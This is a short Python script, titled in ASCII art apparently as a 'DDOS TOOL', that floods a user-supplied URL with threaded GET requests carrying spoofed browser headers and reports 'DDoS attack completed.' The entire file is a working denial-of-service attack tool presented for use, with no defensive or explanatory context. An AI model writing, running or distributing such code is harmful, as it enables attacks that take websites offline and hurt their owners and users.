# ________  ________  ________     ___    ___      ________  ________  ________  ________           _________  ________  ________  ___              
#|\   ____\|\   ____\|\   __  \   |\  \  /  /|    |\   ___ \|\   ___ \|\   __  \|\   ____\         |\___   ___\\   __  \|\   __  \|\  \             
#\ \  \___|\ \  \___|\ \  \|\  \  \ \  \/  / /    \ \  \_|\ \ \  \_|\ \ \  \|\  \ \  \___|_        \|___ \  \_\ \  \|\  \ \  \|\  \ \  \            
# \ \  \  __\ \_____  \ \   _  _\  \ \    / /      \ \  \ \\ \ \  \ \\ \ \  \\\  \ \_____  \            \ \  \ \ \  \\\  \ \  \\\  \ \  \           
 # \ \  \|\  \|____|\  \ \  \\  \|  /     \/        \ \  \_\\ \ \  \_\\ \ \  \\\  \|____|\  \            \ \  \ \ \  \\\  \ \  \\\  \ \  \____      
  # \ \_______\____\_\  \ \__\\ _\ /  /\   \         \ \_______\ \_______\ \_______\____\_\  \            \ \__\ \ \_______\ \_______\ \_______\    
   # \|_______|\_________\|__|\|__/__/ /\ __\         \|_______|\|_______|\|_______|\_________\            \|__|  \|_______|\|_______|\|_______|    
                                              
                                                                                                                                                   
                                                                                                                                                   






import requests
import threading

def send_request(target_url):
    try:
        response = requests.get(target_url, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }, timeout=5)
        if response.status_code == 200:
            print(f"Request: Sent")
        else:
            print(f"Request: Not Sent (Status Code: {response.status_code})")
    except requests.RequestException as e:
        print(f"Request: Not Sent (Error: {e})")

def ddos(target_url, num_requests):
    threads = []
    for _ in range(num_requests):
        thread = threading.Thread(target=send_request, args=(target_url,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    target_url = input("Enter the target URL: ")
    num_requests = int(input("Enter the number of requests: "))

    ddos(target_url, num_requests)
    print("DDoS attack completed.")